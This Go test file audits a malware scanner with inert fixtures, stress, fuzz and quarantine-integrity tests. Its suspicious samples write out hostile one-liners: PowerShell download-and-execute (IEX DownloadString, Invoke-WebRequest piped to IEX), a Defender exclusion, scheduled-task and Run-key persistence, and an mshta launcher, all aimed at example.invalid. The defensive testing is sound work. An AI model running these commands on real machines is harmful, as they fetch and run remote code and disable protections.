package main

// Stage 4 exploratory audit only. No production code is changed by this file.
// Fixtures are inert data. Tests do not run scripts, fetch malware, or change
// machine security settings. Diagnostic failures are logged, not asserted as
// production regressions; safety invariants are asserted.

import (
 "archive/zip"
 "bytes"
 "context"
 "fmt"
 "math/rand"
 "os"
 "path/filepath"
 "runtime"
 "sort"
 "strings"
 "testing"
 "time"
)

type auditCase struct {
 name, filename, category string
 content []byte
 archive map[string][]byte
 expected bool
}

func auditZip(t testing.TB, entries map[string][]byte) []byte {
 t.Helper()
 var out bytes.Buffer
 zw:=zip.NewWriter(&out)
 names:=make([]string,0,len(entries))
 for n:=range entries { names=append(names,n) }
 sort.Strings(names)
 for _,n:=range names {
  f,err:=zw.Create(n); if err!=nil {t.Fatal(err)}
  if _,err=f.Write(entries[n]);err!=nil {t.Fatal(err)}
 }
 if err:=zw.Close();err!=nil {t.Fatal(err)}
 return out.Bytes()
}

func TestStage4HoldoutCapabilityMatrix(t *testing.T) {
 remote:="IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/inert')"
 tail:=append(bytes.Repeat([]byte("# filler line here\n"), 25000),[]byte(remote)...)
 middle:=append(bytes.Repeat([]byte("# filler line here\n"),25000), []byte(remote)...)
 middle=append(middle, bytes.Repeat([]byte("# safe padding\n"),25000)...)
 lastEntry:=map[string][]byte{}
 for i:=0;i<1500;i++ {lastEntry[fmt.Sprintf("file%04d.txt",i)]=[]byte("safe")}
 lastEntry["zzzz-fake.pdf.exe"]=[]byte("inert")
 outer:=auditZip(t,map[string][]byte{"inner.zip":auditZip(t,map[string][]byte{"deep.zip":auditZip(t,map[string][]byte{"invoice.pdf.exe":[]byte("inert")})})})
 cases:=[]auditCase{
  {"disguised executable","invoice.pdf.exe","simple signal",[]byte("inert"),nil,true},
  {"bidi filename","notes\u202eexe.txt","simple signal",[]byte("inert"),nil,true},
  {"remote execution","download.ps1","script signal",[]byte(remote),nil,true},
  {"inline IEX pipeline","pipe.ps1","script signal",[]byte("Invoke-WebRequest http://example.invalid/anything | IEX"),nil,true},
  {"encoded command","start.cmd","script signal",[]byte("powershell -enc AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"),nil,true},
  {"defender exclusions","exclusions.ps1","script signal",[]byte("Add-MpPreference -ExclusionPath C:\\\\Example"),nil,true},
  {"scheduled interpreter","schedule.cmd","persistence signal",[]byte("schtasks /create /tn Test /tr powershell.exe"),nil,true},
  {"run key command","registry.cmd","persistence signal",[]byte("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /d sample.exe"),nil,true},
  {"script in zip","scripts.zip","archive signal",nil,map[string][]byte{"hidden.ps1":[]byte(remote)},true},
  {"archive within archive within archive","nested.zip","archive signal",outer,nil,true},
  {"script appended to file","late.ps1","bounded read",tail,nil,true},
  {"script in middle of file","middle.ps1","bounded read",middle,nil,true},
  {"entry past zip entry limit","limit.zip","bounded read",nil,lastEntry,true},
  {"same script in text file","document.txt","content blindspot",[]byte(remote),nil,true},
  {"suspicious cmd HTA launcher","launcher.cmd","content blindspot",[]byte("mshta.exe http://example.invalid/inert"),nil,true},
  {"JavaScript remote eval","payload.js","content blindspot",[]byte("eval(await fetch('http://example.invalid/inert').then(x=>x.text()))"),nil,true},
  {"7z unsupported container","opaque.7z","content blindspot",[]byte(remote),nil,true},
  {"ordinary exe","utility.exe","benign",[]byte("inert"),nil,false},
  {"ordinary script","hello.ps1","benign",[]byte("Write-Host hello"),nil,false},
  {"ordinary zip","plain.zip","benign",nil,map[string][]byte{"readme.txt":[]byte("hello")},false},
  {"ordinary docx","plain.docx","benign",nil,map[string][]byte{"word/document.xml":[]byte("<doc/>")},false},
  {"comment-only ps1","notes.ps1","benign",[]byte("# "+remote+"\nWrite-Host hi"),nil,false},
  {"inline literal quotation","quoted.ps1","benign",[]byte("Write-Host \"Invoke-WebRequest http://example.invalid/x | IEX\""),nil,false},
  {"block-comment script","commentblock.ps1","benign",[]byte("<#\n"+remote+"\n#>\nWrite-Host hi"),nil,false},
  {"documentation containing EICAR","doc.txt","benign",append([]byte("Example signature: "),eicar...),nil,false},
  {"quoted encoded PowerShell","quoted.cmd","benign",[]byte("echo powershell -enc AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"),nil,false},
  {"ordinary image MZ string","sample.jpg","benign",[]byte("MZ is text, not a PE image"),nil,false},
  {"ordinary shortcut","normal.lnk","benign",[]byte("inert shortcut fixture"),nil,false},
  {"shortcut literal encoded string","note.lnk","benign",[]byte("powershell -enc AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"),nil,false},
  {"legal renamed process","svchost.exe","benign",[]byte("inert renamed sample, not malware"),nil,false},
  {"startup note","startup.txt","benign",[]byte("just a note"),nil,false},
 }
 base:=t.TempDir()
 tp,fn,fp,tn:=0,0,0,0
 perCategory:=map[string][4]int{}
 for i,c:=range cases {
  dir:=filepath.Join(base,fmt.Sprintf("%03d",i))
  if err:=os.MkdirAll(dir,0700);err!=nil {t.Fatal(err)}
  path:=filepath.Join(dir,c.filename)
  data:=c.content
  if c.archive!=nil {data=auditZip(t,c.archive)}
  if err:=os.WriteFile(path,data,0600);err!=nil {t.Fatal(err)}
  stat,err:=os.Stat(path);if err!=nil{t.Fatal(err)}
  f:=inspectFile(path,stat)
  found:=f!=nil
  p:=perCategory[c.category]
  switch {
  case found && c.expected:tp++;p[0]++
  case !found && c.expected:fn++;p[1]++;t.Logf("MISSED [%s]: %s",c.category,c.name)
  case found && !c.expected:fp++;p[2]++;t.Logf("FALSE FLAG [%s]: %s reasons=%v",c.category,c.name,f.Reasons)
  default:tn++;p[3]++
  }
  perCategory[c.category]=p
 }
 keys:=make([]string,0,len(perCategory));for k:=range perCategory{keys=append(keys,k)};sort.Strings(keys)
 for _,k:=range keys{p:=perCategory[k];t.Logf("CATEGORY %-23s TP=%d FN=%d FP=%d TN=%d",k,p[0],p[1],p[2],p[3])}
 t.Logf("AUDIT HOLDOUT TP=%d FN=%d FP=%d TN=%d suspicious recall=%.1f%% benign false-flag rate=%.1f%%",tp,fn,fp,tn,100*float64(tp)/float64(tp+fn),100*float64(fp)/float64(fp+tn))
 if tp+fn!=17||fp+tn!=14 {t.Fatalf("test corpus incomplete: %d suspicious %d benign",tp+fn,fp+tn)}
}

func TestStage4StressManyFiles(t *testing.T) {
 if testing.Short(){t.Skip("skip filesystem stress in short mode")}
 base:=t.TempDir()
 const total=6000
 const planted=60
 for i:=0;i<total;i++{
  name:=fmt.Sprintf("ordinary-%05d.txt",i)
  if i<planted{name=fmt.Sprintf("trap-%05d.pdf.exe",i)}
  if err:=os.WriteFile(filepath.Join(base,name),[]byte("inert text only"),0600);err!=nil{t.Fatal(err)}
 }
 runtime.GC()
 var before,after runtime.MemStats
 runtime.ReadMemStats(&before)
 a:=newApp(nil)
 started:=time.Now()
 if err:=a.runHeuristic(context.Background(),"custom",base);err!=nil{t.Fatal(err)}
 elapsed:=time.Since(started)
 runtime.ReadMemStats(&after)
 status,findings:=a.snapshot()
 t.Logf("STRESS files=%d findings=%d elapsed=%s rate=%.0f files/sec allocDelta=%d MiB heapAfter=%d MiB",status.Files,len(findings),elapsed,float64(status.Files)/elapsed.Seconds(),(after.TotalAlloc-before.TotalAlloc)/(1024*1024),after.HeapAlloc/(1024*1024))
 if status.Files!=total||len(findings)!=planted {t.Fatalf("stress scan incorrect files=%d findings=%d",status.Files,len(findings))}
}

func TestStage4RandomArchiveAndContentRobustness(t *testing.T) {
 rng:=rand.New(rand.NewSource(4106))
 base:=t.TempDir()
 total:=320
 for i:=0;i<total;i++{
  name:=fmt.Sprintf("fuzz-%04d.zip",i)
  path:=filepath.Join(base,name)
  n:=rng.Intn(3000)
  data:=make([]byte,n)
  if _,err:=rng.Read(data);err!=nil{t.Fatal(err)}
  if i%7==0 {data=auditZip(t,map[string][]byte{"notes.txt":data})}
  if err:=os.WriteFile(path,data,0600);err!=nil{t.Fatal(err)}
  stat,err:=os.Stat(path);if err!=nil{t.Fatal(err)}
  _=inspectFile(path,stat)
 }
 t.Logf("ROBUSTNESS parsed %d deterministic random/corrupted ZIP inputs without a crash",total)
}

func TestStage4QuarantineMutationAndIntegrity(t *testing.T) {
 base:=t.TempDir()
 vault:=&Vault{path:filepath.Join(base,"vault")}
 if err:=os.MkdirAll(vault.path,0700);err!=nil{t.Fatal(err)}
 path:=filepath.Join(base,"safe.pdf.exe")
 if err:=os.WriteFile(path,[]byte("sampleAAAA"),0600);err!=nil{t.Fatal(err)}
 st,_:=os.Stat(path);f:=inspectFile(path,st);if f==nil{t.Fatal("fixture was not flagged")}
 // A changed file with different timestamp must be rejected.
 if err:=os.WriteFile(path,[]byte("different length"),0600);err!=nil{t.Fatal(err)}
 if _,err:=vault.quarantine(*f);err==nil{t.Fatal("file change was not rejected")}
 // Same length + restored timestamp: investigate whether modified data can evade metadata check.
 if err:=os.WriteFile(path,[]byte("sampleBBBB"),0600);err!=nil{t.Fatal(err)}
 if err:=os.Chtimes(path,st.ModTime(),st.ModTime());err!=nil{t.Fatal(err)}
 got,err:=vault.quarantine(*f)
 if err==nil {
  t.Log("RISK: same-length same-mtime replacement was accepted after scan; reviewed bytes were not revalidated")
  b,_:=os.ReadFile(vault.data(got.ID))
  if string(b)!="sampleBBBB"{t.Fatalf("quarantined unexpected content %q",b)}
  // Tamper check: hash verification must reject restore.
  if err:=os.WriteFile(vault.data(got.ID),[]byte("tampered!!"),0600);err!=nil{t.Fatal(err)}
  if err:=vault.restore(got.ID);err==nil{t.Fatal("tampered quarantine content was restored")}
  t.Log("PASS: tampered quarantine restore refused")
 } else {
  t.Logf("PASS: same-size same-mtime replacement rejected: %v",err)
 }
}

func TestStage4DetectResultLimitDiagnostic(t *testing.T) {
 a:=newApp(nil)
 for i:=0;i<3100;i++{
  a.add(Finding{Path:fmt.Sprintf("file-%04d.exe",i),Score:80})
 }
 _,f:=a.snapshot()
 if len(f)!=3000{t.Fatalf("expected 3000 findings cap, got %d",len(f))}
 t.Log("LIMITATION: 100 additional findings silently dropped after 3000 results; scanner does not disclose truncation in status")
}

func TestStage4EICARQuoteVsExact(t *testing.T) {
 if !isExactEICAR(eicar){t.Fatal("exact EICAR signature not recognized")}
 if isExactEICAR(append([]byte("Document quote "),eicar...)){t.Fatal("quoted signature falsely recognized as exact test")}
 t.Log("PASS: EICAR exact-versus-quoted check")
}

func TestStage4DefenderOutputVariants(t *testing.T) {
 variants:=[]struct{name,text string;want int}{
  {"empty","Scan complete. No threats.",0},
  {"single","Threat : Virus:Test/A\nResources : 1 total\n file : C:\\\\Temp\\\\sample.txt",1},
  {"mixed casing","THREAT: Trojan:Test/B\n FILE: C:\\\\Temp\\\\bad.exe",1},
  {"without path","Threat : Trojan:Test/C\nResources : 1 total",1},
  {"two threats","Threat : Virus:Test/D\n file: C:\\\\Temp\\\\a\nThreat: Trojan:Test/E\n file: C:\\\\Temp\\\\b",2},
 }
 for _,v:=range variants{
  actual:=parseDefender(v.text)
  t.Logf("DEFENDER PARSER %-18s resources=%d expected=%d",v.name,len(actual),v.want)
  if len(actual)!=v.want{t.Errorf("%s: parser returned %d, expected %d",v.name,len(actual),v.want)}
 }
}
